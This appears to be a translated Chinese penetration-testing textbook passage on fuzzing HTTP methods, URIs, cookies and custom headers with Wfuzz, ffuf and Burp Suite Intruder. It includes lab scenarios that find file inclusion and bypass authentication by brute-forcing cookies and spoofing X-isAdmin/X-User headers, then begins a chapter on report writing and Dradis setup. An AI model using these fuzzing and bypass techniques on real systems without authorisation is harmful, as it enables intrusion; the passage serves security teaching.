# 使用 Burp Suite Intruder 来模糊测试 HTTP 方法/动词

HTTP 动词也可以通过 Burp Suite Intruder 来进行模糊测试，方法是单击 Intruder 选项卡，然后打开 Positions 子选项卡。Burp Suite 将自动使用**§**载荷标记标记任何匹配`[parameter]=[value]`格式的值。在载荷标记内的任何内容都将被 Burp Suite 视为模糊向量。Burp Suite Intruder 支持四种攻击类型：Sniper、Battering Ram、Pitchfork 和 Cluster Bomb。要了解有关攻击类型的更多信息，请参阅[`portswigger.net/burp/documentation/desktop/tools/intruder/positions.`](https://portswigger.net/burp/documentation/desktop/tools/intruder/positions)

让我们通过单击“清除§”按钮来清除模糊向量位置，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f53cdd70-96a5-4e7b-8124-dd97ed63447f.png)

要对 HTTP 请求方法进行模糊测试，让我们通过单击“添加§”按钮添加载荷标记（**§**），如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0a140795-64f2-454d-8db1-4597c0f1b93a.png)

现在设置了载荷标记，我们需要定义应该由入侵者用于模糊测试的载荷。这可以通过单击“载荷”选项卡来完成（如下面的屏幕截图所示）。在这种情况下，我们将使用包含一些常见 HTTP 请求方法的单词列表。可以通过首先将载荷类型设置为“简单列表”，然后单击“加载…”按钮来加载列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e8a6247d-7d36-4cea-b666-ba4b9ab5a1c8.png)

加载了单词列表后，我们可以单击“开始攻击”按钮开始模糊测试：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9749d679-1c7b-44d7-a7ff-23f3e70a5f25.png)

将打开一个新窗口，显示模糊测试的结果，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c26bd352-5b18-44af-87a4-a37065e6462e.png)

在前面的屏幕截图中，我们可以观察到当使用 HTTP CONNECT 和 TRACE 方法时，服务器分别以 HTTP `400`（**错误请求**）和 HTTP `405`（**不允许的方法**）代码做出响应。这显示了关于这两个请求头的 Web 应用程序服务器的行为。 

注意：我们也可以自由使用在线可用的其他自定义列表来模糊测试 HTTP 方法。

# HTTP 请求 URI

开始 HTTP 请求 URI 模糊测试，我们首先需要了解 URI 的结构。URI 具有以下通用可接受的结构：

```
http://[domain]/[Path]/[Page].[Extension]?[ParameterName]=[ParameterValue]
```

# 使用 Wfuzz 来模糊测试 HTTP 请求 URI 路径

要使用 Wfuzz 来模糊测试 URI 路径，让我们执行以下命令：

```
wfuzz -w <wordlist> <url>/FUZZ
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e43be872-33ab-4b77-8005-195e6fbe5352.png)

使用`--hc`开关，我们可以根据 HTTP 代码过滤结果。在这种情况下，我们已经过滤了 HTTP `404`（**未找到**）代码，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0b541a0f-1df0-4d38-9f37-5eacbdfe27d4.png)

我们也可以使用**ffuf**来做同样的事情。

# 使用 ffuf 来模糊测试 HTTP 请求 URI 路径

要模糊 URI 路径，让我们执行以下命令：

```
./ffuf -c -w <wordlist> -u <url>/FUZZ
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0db80f3c-d17b-4db1-b8e7-75e5da2ecd4f.png)

在前面的两种情况下，`FUZZ`关键字被替换为用于模糊处理目录名称的单词列表条目。正如我们在前面的屏幕截图中所看到的，当模糊器请求 css、img、js 和 setup 时，服务器响应了 HTTP `301`。通过观察响应的大小和单词，我们可以得出结论，模糊器能够在 Web 应用程序服务器中找到目录。

# 使用 Burp Suite Intruder 进行 HTTP 请求 URI 路径的模糊处理

现在我们已经使用了**Wfuzz**和**ffuf**来模糊处理 URI 路径，让我们尝试在 Burp Suite Intruder 中进行相同的操作。这里的概念是相同的。让我们放置一个负载标记（如下面的屏幕截图所示），以便模糊器将数据发送到向量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6babe9a4-8114-4323-b048-3265b0b2d1de.png)

让我们将负载类型设置为“简单列表”，并使用“加载…”按钮导入一个单词列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/df043969-85ec-4ed1-b308-41b6e6983672.png)

单击“开始攻击”按钮（如前面的屏幕截图所示），Intruder 将尝试使用给定的自定义单词列表对 URI 路径进行模糊处理。模糊器的结果将显示在另一个窗口中，其中包括 HTTP 响应代码和长度，我们可以在下面的屏幕截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8bd12f1d-54ea-41fc-958f-b504201833d3.png)

正如我们在前面的屏幕截图中所看到的，我们能够模糊处理 Web 应用程序服务器的 URI 路径（目录）。现在，让我们看看如何使用相同的工具模糊处理 URI 文件名和文件扩展名。

# 使用 Wfuzz 进行 HTTP 请求 URI 文件名和文件扩展名的模糊处理

Wfuzz 还可以模糊处理 Web 应用程序服务器的文件名和文件扩展名：

+   `wfuzz -c --hc=404 -z file,SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt http://192.168.2.19:8090/xvwa/FUZZ.php`（文件名模糊处理）

+   `wfuzz -c --hc=404 -z list,php-asp-aspx-jsp-txt http://192.168.2.19:8090/xvwa/home.FUZZ`（文件扩展名模糊处理）

# 使用 ffuf 进行 HTTP 请求 URI 文件名和文件扩展名的模糊处理

要对 HTTP 请求 URI 文件名和文件扩展名进行模糊处理，可以使用 ffuf 模糊器的以下命令：

+   `ffuf -c -w <wordlist> -u http://192.168.2.19:8090/xvwa/FUZZ.php`（文件名模糊处理）

+   `ffuf -c -w <wordlist> -u http://192.168.2.19:8090/xvwa/home.FUZZ`（文件扩展名模糊处理）

# 使用 Burp Suite Intruder 进行 HTTP 请求 URI 文件名和文件扩展名的模糊处理

负载标记放置在文件扩展名之前，以模糊文件名（如我们在以下屏幕截图中所见）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/cb4d3bdb-ef88-4da7-b5b9-d86b0a8efc4f.png)

负载标记放置在文件名之后，以模糊文件扩展名（如我们在以下屏幕截图中所见）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b8eb76a9-67ad-4b49-a23e-fec14ac3b464.png)

Wfuzz 和 Burp Suite Intruder 的很酷的功能是能够使用多个模糊向量来模糊处理多个负载位置。

# 使用 Wfuzz 进行 HTTP 请求 URI 的模糊处理（GET 参数+值）

Wfuzz 具有内置功能，可以通过添加**FUZZ**、**FUZ2Z**、**FUZ3Z**...关键字来模糊处理多个负载位置。假设我们想要模糊处理 Web 应用程序服务器的`GET`参数名称和值。由于我们不能在两个模糊向量中使用相同的单词列表，我们将使用**FUZZ**和**FUZ2Z**关键字来执行模糊处理。让我们在 Wfuzz 中执行以下命令：

```
wfuzz -c -z list,<parameter_wordlist> -z <value_wordlist> http://<target>:<port>/?FUZZ=FUZ2Z
```

正如我们在前面的命令中所看到的，我们使用了`-z`选项（是的，我们可以重复使用`-z`，`-H`和`-b`选项）和`[parameter]=[value]`以`/?FUZZ=FUZ2Z`格式显示。执行此命令时，模糊器将使用`parameter_wordlist`中的第一个条目，将其替换为`FUZZ`关键字，然后通过`FUZ2Z`循环遍历所有`value_wordlist`条目。就像这样，模糊器将通过两个单词列表进行模糊处理。现在让我们看看如何使用 Intruder 实现相同的功能。

# 使用 Burp Suite Intruder 进行 HTTP 请求 URI 的模糊处理（GET 参数+值）

在 Burp Suite 中，不同的攻击类型可以帮助我们进行这种测试。为了同时使用两个字典进行模糊测试，我们将在 Intruder 中使用簇炸弹攻击类型：

1.  首先，让我们将攻击类型设置为簇炸弹，并将有效负载标记设置为/?§§=§§（如下图所示）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/438502f0-3dda-4096-81b9-b473985b4974.png)

1.  在这种情况下，我们将使用两个有效负载集，让我们将第一个有效负载集（参数名称）设置为简单列表，并将有效负载类型更改为 Simple list：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1ddec7f4-1858-44c1-8b17-b64ad292725b.png)

1.  现在我们的第一个有效负载集已经配置好了，让我们配置第二个有效负载集（参数值）。在将有效负载集设置为`2`后，让我们将有效负载类型更改为`Numbers`。由于参数值是整数格式（在这种情况下），让我们将范围设置为`1`到`5`，并将步长设置为`1`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/739393b1-0221-4070-bc95-af0d19774bbf.png)

1.  我们的 Intruder 现在已经配置好了，可以对多个有效负载集进行模糊测试。让我们通过单击“开始攻击”按钮（如前面的屏幕截图中所示）开始模糊测试。然后我们会看到以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c7d02540-96f8-4fe4-b29a-3b334581b6ed.png)

成功！

正如我们从前面的屏幕截图中看到的，Intruder 能够找到一个带有一些参数值的参数名称。我们如何区分在字典中找到的参数名称和值与其他条目？通过观察响应长度。

让我们尝试使用**Wfuzz**模糊三个模糊向量（目录、文件和文件扩展名）。这肯定会花费很多时间，因为它同时结合了不同的有效负载集。为了对目录、文件名和文件扩展名进行模糊测试，我们可以执行以下命令：

```
wfuzz -c --hc=404 -z file,SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -z file,wfuzz/wordlist/general/common.txt -z list,php-txt http://192.168.2.19/FUZZ/FUZ2Z.FUZ3Z
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/55074e56-707a-49f3-9699-47f0bfffd6ab.png)

结果可以根据字符数（`--hh`）、单词数（`--hw`）或行数（`--hl`）进行过滤：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/984a6a22-925e-48ae-9f28-1ae8590564a3.png)

现在我们对如何模糊 HTTP 请求 URI 有了一些了解，让我们了解如何模糊 HTTP 头部。

# HTTP 请求头

模糊请求头在概念上与模糊 URI 相同。唯一的区别是，通过模糊请求头找到的漏洞数量将比模糊 URI 找到的漏洞数量更多，因为这些头部被发送到 Web 应用程序服务器，服务器会在内部处理这些头部。这意味着我们有更大的范围来发现漏洞。

有不同类型的 HTTP 头部在起作用：

+   标准的 HTTP 头（`Cookie`，`User-Agent`，`Accept`，`Host`等）

+   非标准的 HTTP 头（`X-Forwarded-For`，`X-Requested-With`，`DNT`等）

+   自定义头部（除了非标准头部之外，任何以`X-`开头的头部）

让我们尝试了解如何使用与本章其他部分相同的模糊器模糊每种类型的头部。

# 使用 Wfuzz、ffuf 和 Burp Suite 对标准的 HTTP 头进行模糊测试

标准的 HTTP 头通常被 Web 服务器用来处理客户端请求。在进行 Web 应用程序渗透测试时，建议了解 Web 应用程序的工作原理以及 Web 应用程序服务器如何处理请求头（标准和非标准）。更好地了解 Web 应用程序可以帮助我们定义一些相当不错的模糊向量，从而大大增加在 Web 应用程序中找到逻辑缺陷的可能性。在本主题中，我们将通过一些自定义测试案例来了解如何对 Web 应用程序进行模糊测试。

# 场景 1 - Cookie 头部模糊

让我们看一个场景。我们有一个 PHP 文件，名为`- cookie_test.php`。我们使用`Cookie`标志请求这个文件，值为`lang=en_us.php`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f907ce35-6c74-40d8-974d-31c5852ff288.png)

服务器响应消息为正在使用的语言：*英语*：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4325003b-aaaa-4a0d-9d78-8e8297ce34c8.png)

从`en_us.php`文件中，我们可能会认为`cookie`参数正在从服务器包含文件（文件包含）并执行文件，然后打印服务器的消息。

现在让我们看看如何使用**Wfuzz**模糊`cookie`头部：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a43071e4-195f-4331-bd11-9c1795df1329.png)

正如我们在上述截图中所看到的，`-b`选项用于提供`cookie`值，我们使用了`lang=FUZZ`。使用基于 Web 应用程序攻击的模糊向量，我们能够找到服务器响应长度不同的有效载荷。在这里，我们使用了 fuzzer 找到的有效载荷之一：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1dd33b80-ed49-433d-aa23-1b25d9468162.png)

我们能够确认存在文件包含漏洞。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/79d44d89-396a-4c6b-815d-3891d9b87eb7.png)

使用**ffuf**执行以下命令也可以完成相同的操作：

```
fuff -c -b lang=FUZZ -w <wordlist> -u http://192.168.2.19/cookie_test.php
```

对于 Burp Suite，我们只需要将有效载荷标记添加到`Cookie`头部：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9e5382b2-b171-43c6-ad2f-a07ee8040a83.png)

同样，我们可以使用相同的工具来模糊用户定义的`Cookie`头部。让我们来看看这个。

# 情景 2 - 用户定义的 cookie 头部模糊

这种情况与之前的情况不同。在这种情况下，我们将使用`lang=en_us` cookie 值从服务器请求`cookie_test.php`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3a3c04d4-653c-44ab-9315-ea001db10402.png)

服务器响应为未经授权的访问！如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/85a9f71c-fedd-418d-b148-cd4b521dc0ad.png)

仅使用普通请求，服务器将定义的 cookie 回显给我们：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/59da639e-6499-4421-8134-404060b7b223.png)

假设我们的目标是访问`home.php`文件，但目前受到限制，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/de682f84-8bbc-46f9-9fab-5ca80d9f92ae.png)

由于没有登录认证页面，我们无法对服务器进行身份验证，我们必须假设身份验证是在`User-Agent`部分或`Cookie`部分进行的。让我们假设身份验证是通过检查 cookie 值来进行的。客户端可以使用用户定义的 cookie 值来连接到服务器并成功进行身份验证。为了模糊一个盲目的用户定义的 cookie 值，让我们使用 wfuzz 执行以下命令：

```
wfuzz --sh=239 -c -z file,<username_wordlist> -z file,<password_wordlist> -b lang=en_us -b FUZZ=FUZ2Z <url>
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c1a68f1e-ec7a-4c7c-b1bd-c1ffe7849747.png)

哇！正如我们在上述截图中所看到的，当插入一个具有值`Cookie: admin=admin;`的用户定义的 cookie 时，服务器响应了一个不同的页面。让我们使用相同的用户定义的 cookie 参数名称和值来请求相同的页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3f9648d5-8084-47b5-9a56-4113c07cb214.png)

在下面的截图中，我们可以看到服务器正在将我们重定向到`home.php`页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f4c616a2-02f6-41cd-ac4a-6443cdcd1531.png)

通过模糊用户定义的 cookie 参数名称和值，我们能够使用`cookie_test.php`页面进行身份验证，以访问`home.php`页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2c01f185-880d-4931-b857-8387489d6b28.png)

相同的方法可以用来发现各种漏洞，如 SQL 注入，XSS 和 RCE。

注意：这完全取决于 Web 应用程序以及 Web 应用程序如何处理`Cookie`头部。如果`Сookie`头部只是用于服务器向客户端提供临时会话，那么我们除了测试基于会话的漏洞之外，别无他法。

其他标准头部也可以进行模糊，包括`User-Agent`，`Host`，`Accept`和`Content-Type`。在模糊非标准 HTTP 头部的情况下，我们可以使用一个单词列表来检查 fuzzer 请求的每个头部的服务器响应。有时，通过使用这些非标准头部，如 X-Forwarded-For 等，我们可以绕过服务器对应用程序设置的基于 IP 的访问限制。

# 使用 Wfuzz，ffuf 和 Burp Suite 模糊自定义头部

在许多网络应用程序中，开发人员引入了一些自定义的 HTTP 头，当请求被处理时，这些头就会被解析。从生成用户特定令牌到通过这些自定义头实现访问控制，这些头具有完全不同的功能级别。在这种情况下，有时开发人员会忘记对用户输入进行消毒，这反过来可能成为利用的目标。让我们看看如何使用 Wfuzz、ffuf 和 Burp Suite 来模糊自定义头。

# 场景 3 - 自定义头模糊

在这种情况下，我们有一个运行在 PHP 上的应用程序 - `custom_header.php`。我们从服务器请求以下页面：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0045ba2f-03b2-4731-aea7-517f538ed962.png)

服务器以未经授权的访问！消息和两个未知的头部 - `X-isAdmin: false`和`X-User: Joe`（正如我们在下面的屏幕截图中所看到的）做出回应：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7e7db2c9-1969-459a-ac0a-942f9daee7d1.png)

服务器的消息如下：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/35912b35-cb43-45a7-aa6c-48e8c18811d4.png)

通过观察这两个自定义头，我们可以假设服务器也在处理这些头。第一个头，即`X-isAdmin`，看起来像是一个接受布尔值`true`或`false`的自定义头。另一个头，`X-User`，可能接受用户的名字，所以值是字符串格式。让我们使用**Wfuzz**来模糊这些头，找出我们能做些什么。让我们在**Wfuzz**中执行以下命令：

```
wfuzz -c -z list,true-false -z file,<username_wordlist> -H “X-isAdmin: FUZZ” -H “X-User: FUZ2Z” <url>
```

以下屏幕截图显示了上述命令的输出：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/20e2586b-6999-4ada-99a0-690b403b5702.png)

我们可以在 HTTP 请求中的多个位置使用`-H`标志。现在我们从服务器得到了相同的响应，让我们根据字符长度过滤结果（`--hh`标志）：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/681defe9-2e9e-455d-938d-346f0e7fbb76.png)

不可思议！我们找到了`X-isAdmin: true`和`X-User: Billy`的值。这意味着 Billy 是管理员。使用这个自定义头在 HTTP 请求中，让我们看看我们是否能访问页面：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7ffc3c57-317f-4354-8074-c4dd4636f9b0.png)

正如我们在下面的屏幕截图中所看到的，我们能够使用自定义的 HTTP 头进行身份验证，并在身份验证后，服务器将我们重定向到`home.php`页面：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3b970bdd-0872-4c20-b139-d72256846f17.png)

`home.php`页面如下所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d0a8de11-cdfe-4262-860b-7595ffcc0674.png)

现在我们对模糊 HTTP 请求头有了一些清晰的认识，我们也可以在 HTTP `POST`参数上使用类似的模糊技术，我们可以在下面的屏幕截图中看到：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5214d1b6-2d45-4bea-add1-52fcb68f7847.png)

同样，我们也可以对 HTTP `POST`参数进行模糊测试，以找到应用程序支持的 API 和这些 API 参数支持的可接受值。

对 Web 应用程序攻击向量进行模糊测试可以为我们提供更多关于 Web 应用程序渗透测试的见解。当模糊器发现有趣的东西时，记录每个请求和响应总是一个好习惯。最后，如果向模糊器提供详细的模糊数据，模糊测试就会非常有效。在大多数情况下，模糊测试可以找到代码执行和其他技术漏洞，这是通用 Web 应用程序扫描器无法找到的。

# 总结

在本章中，我们首先了解了模糊测试的基础知识和不同类型的模糊攻击。然后，我们深入研究了 Web 应用程序模糊测试，并查看了**Wfuzz**和**ffuf**的安装。之后，我们对 HTTP 请求动词和请求 URI 进行了模糊测试。在本章的最后，我们看了三种情景：cookie 头部模糊测试，用户定义的 cookie 头部模糊测试和自定义头部模糊测试。通过学习模糊测试，您现在可以了解 Web 应用程序的行为，这将帮助您发现技术和逻辑漏洞。您可以在进行漏洞赏金、或者参加具有挑战性的**夺旗赛**（**CTFs**）时，将模糊测试作为常规渗透测试的一部分。

在下一章中，我们将看一下渗透测试报告中必须包括的关键要点。

# 问题

1.  我可以对基于 SSL 的 Web 应用程序执行模糊测试吗？

1.  这些模糊测试工具（本章提到的）在 Windows 中受支持吗？

1.  我需要在所有 Web 应用程序渗透测试中执行模糊测试吗？

1.  如果我执行模糊测试，会发现什么样的漏洞？

# 进一步阅读

+   Wfuzz 下载页面：[`github.com/xmendez/wfuzz`](https://github.com/xmendez/wfuzz)

+   ffuf 下载页面：[`github.com/ffuf/ffuf`](https://github.com/ffuf/ffuf)

+   Burp Suite 官方网站：[`portswigger.net/burp`](https://portswigger.net/burp)

+   了解模糊测试的基础知识：[`owasp.org/www-community/Fuzzing`](https://owasp.org/www-community/Fuzzing)

+   了解 Web 应用程序攻击向量：[`www.blackhat.com/presentations/bh-dc-07/Sutton/Presentation/bh-dc-07-Sutton-up.pdf`](https://www.blackhat.com/presentations/bh-dc-07/Sutton/Presentation/bh-dc-07-Sutton-up.pdf)


# 第二十章：撰写渗透测试报告

众所周知，一个好的报告必须包含有关系统漏洞的所有必要细节。所有渗透测试标准都强调撰写结构良好的报告。在本章中，我们将学习一些工具，以便撰写一个好的报告。

报告必须包含的关键要点如下：

+   漏洞的详细信息

+   CVSS 评分

+   漏洞对组织的影响

+   修补漏洞的建议

报告应分为两部分：一部分供技术团队使用，另一部分供管理层使用。

在本章中，我们将涵盖以下主题。这些主题将涵盖报告生成过程中常用的工具：

+   报告撰写简介

+   Dradis 框架简介

+   与 Serpico 合作

# 技术要求

本章的技术要求如下：

+   Dradis（[`github.com/dradis`](https://github.com/dradis)）

+   Serpico（[`github.com/SerpicoProject/Serpico`](https://github.com/SerpicoProject/Serpico)）

+   数据库服务器（MariaDB/MySQL）

+   Redis 服务器（[`redis.io/download`](https://redis.io/download)）

+   Ruby ([`www.ruby-lang.org/en/downloads/`](https://www.ruby-lang.org/en/downloads/))

# 报告撰写简介

报告是渗透测试中最重要的阶段之一，因为报告的漏洞不仅供技术团队使用，还供管理层使用。通常需要向客户呈现两种类型的报告 - **执行报告** 和**详细技术报告**（**DTR**）。

执行报告是为组织/公司的高层管理人员准备的，以便他们可以根据报告中提到的业务影响做出决策。另一方面，DTR 如其名所示，是详细报告，概述了发现的所有漏洞。这包括建议的步骤，以帮助技术（内部安全运营和开发团队）团队修补漏洞。总的来说，报告应包含以下细节：

+   目的和范围

+   使用的方法和方法论

+   使用的**通用漏洞评分系统（CVSS）**版本

+   执行摘要

+   发现摘要（发现的漏洞列表）

+   漏洞详情

+   结论

+   附录

现在我们已经快速介绍了报告撰写，让我们了解如何撰写一个好的执行报告。

# 撰写执行报告

正如我们在介绍中提到的，执行报告是供 C 级高管和管理层使用的，以便根据进行的风险评估（包括漏洞评估和渗透测试）来理解风险。由于 C 级高管是忙碌的人，报告应尽可能简洁，并包含他们需要的所有信息，以便做出明智的决策。让我们来看看执行报告的通用结构。

# 标题页

顾名思义，标题页包含有关项目、供应商和客户的信息。

# 文档版本控制

这个小节也在 DTR 报告中定义。当进行渗透测试时，报告不是一次性完成的。双方需要进行许多更改，以创建一个对客户和测试人员都可接受的平衡报告。将制作初稿并发送给客户。这个小节记录了从初稿起对报告所做的更改次数。每个更改定义了一个新版本。报告最终确定时，版本号也会在报告中提到。

# 目录

这个小节是报告中最重要的部分之一。**目录**（**ToC**）结构化报告文档，以便 C 级高管能够轻松理解。

# 目标

这个小节向高管介绍了渗透测试项目和定义的时间表。

# 定义的范围

在报告的这个小节中，应提及所有已定义的范围内的 URL、IP、端点等。这些信息有助于高级管理人员快速注意到受影响的资产，这可能对组织产生业务关键影响。

# 主要发现（影响）

报告的这个小节列出了每个漏洞的影响；也就是说，攻击者可以对组织的资产做些什么。这些指针帮助组织评估业务资产的安全级别。高级管理人员将知道组织哪些资产需要立即进行关键修复。

# 问题概述

这个小节让高层管理人员了解发现的漏洞的严重程度。可以使用一个漂亮的饼图或条形图来显示根据严重程度分类的发现的漏洞。

# 战略建议

这个小节为高级管理人员提供了他们可以遵循的建议，以修复那些具有关键性质的漏洞，如果被利用，可能会给业务带来问题。

报告中的所有细节都应以简洁的方式提及，因为执行报告的主要目标是向高层管理提供评估概述。报告中应删除任何不必要的内容。现在，让我们来看一下 DTR 报告。

# 撰写详细的技术报告

此报告应包括有关漏洞的所有技术细节。DTR 是为客户端的技术团队准备的。让我们来看一下 DTR 的通用结构。

# 标题页

顾名思义，标题页包含有关项目、供应商和客户的信息。

# 文档版本控制

这个小节也在执行报告中定义，并且包含的细节是相同的。

# 目录

这个小节是报告中最重要的部分之一。目录将报告文档结构化，以便客户的技术团队能够轻松理解。

# 报告摘要

这个小节提供了对渗透测试项目的概述，并向客户展示了发现的漏洞总数，按其严重程度级别显示。我们可以添加一些漏洞统计数据，如饼图或面积图，并将漏洞定义为关键、高、中、低或信息性。作为渗透测试人员，我们可以添加一个攻击叙述，告诉我们攻击者如何找到这些漏洞，以及攻击者可以利用这些漏洞的程度。报告摘要有助于技术团队以及高级管理人员看到项目的整体成功。

# 定义的范围

在与客户的启动会议中，项目的范围和范围内的目标将已经确定。在报告的这个小节中，应提及所有已定义的范围内的 URL、IP、端点等。这些信息有助于技术团队快速处理手头的漏洞，并与负责范围内 URL/IP 的开发者/管理员团队进行沟通。

将范围添加到报告中的另一个原因是为了使渗透测试人员的项目流程更加顺畅。在范围未定义的情况下，渗透测试人员将无法评估需要完成的工作量或完成项目所需的天数。众所周知，计算渗透测试项目价值的核心实体之一是人天数。

当渗透测试项目处于初始阶段，即与客户讨论项目时，项目的价值将根据客户共享的范围和执行该范围测试所需的人天数来计算。请注意，这些并不是定义项目价值的唯一因素 - 资产、时间表、为项目分配的资源数量、差旅费用（如果有）以及渗透测试人员的初始要求也是一些关键因素。

这个定义的范围有助于渗透测试人员将团队的资源分配到项目中，并定义时间表，以确保项目流程顺畅。如果有许多子项目，例如与同一客户进行内部网络或外部网络渗透测试，定义范围可以确保双方有相同的期望。

# 使用的方法

报告的这一小节应包含渗透测试人员在安全评估期间遵循的方法。最好使用图表展示这个过程，并向客户解释每个过程，以便客户端的技术团队了解他们的组织资产是如何被测试的。

无论渗透测试人员遵循 NIST-800 标准、PTES 标准还是他们自己公司的标准，他们都必须在这一小节中解释这个过程。

# CVSS

CVSS 是用于确定漏洞严重性的免费和开放的行业标准。在定义漏洞的严重性时，我们需要根据 CVSS 评分计算对漏洞进行分类。本小节将向客户介绍 CVSS 以及我们将在报告中使用的版本。在撰写本文时，CVSS 的版本为 CVSS v3.1，于 2019 年 6 月发布。

# 漏洞摘要

渗透测试人员应在报告的这一小节中添加漏洞描述、CVSS 评分、漏洞严重性、受影响的端点/IP、概念验证（PoC）、重现步骤、影响、建议和参考资料。

# 结论

在本小节中，渗透测试人员从攻击者的角度总结了项目的整体难度。任何额外的建议都会添加到这个小节中。

# 附录

任何其他信息，如屏幕截图、服务枚举、CVSS 计算公式以及客户可能需要的其他任何信息都添加到报告的这个子部分中。

现在，您知道如何撰写执行报告以及 DTR。在报告过程中出现的主要问题是收集所有技术细节。作为渗透测试人员，我们必须确保在渗透测试期间收集所有屏幕截图、URL、使用的有效载荷等，以便将这些细节输入 DTR 报告中。

如果范围只是几个 IP 或 URL，那么收集数据不会成为问题，但如果项目很庞大，那么有时收集数据会变得很麻烦。为了解决这些问题，我们可以选择在 GitHub 上公开可用的报告框架。这些框架可以自动解析输出扫描文件和 Nmap 端口扫描结果，并根据输入的细节给出报告。在接下来的部分，我们将讨论一个这样的框架 - Dradis。

# Dradis 框架介绍

Dradis 是一个开源的基于浏览器的应用程序，可用于聚合来自不同工具的输出并生成单个报告。它可以连接到超过 15 种工具，包括 Burp Suite、Nessus、Acunetix 和 Nmap。

# 预安装配置

要安装 Dradis，我们需要安装一些依赖包。它非常易于使用，并且已经预装在 Kali Linux 中。因此，我们将重新安装它，然后学习如何使用它。

首先，我们需要通过运行以下命令来安装依赖项：

```
 apt-get install libsqlite3-dev
 apt-get install libmariadbclient-dev-compat
 apt-get install mariadb-client-10.1
 apt-get install mariadb-server-10.1
 apt-get install redis-server
```

接下来，我们将继续安装。

# 安装和设置

我们可以使用以下命令下载 Dradis 社区版的 GitHub 存储库：

```
git clone https://github.com/dradis/dradis-ce.git
```

上述命令的输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/db02843b-4c63-466d-b8da-cb3bd7520d2b.png)

现在，我们需要运行以下命令：

```
bundle install –path PATH/TO/DRADIS/FOLDER
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c281912f-51bd-4891-8f65-e13d06a819b2.png)

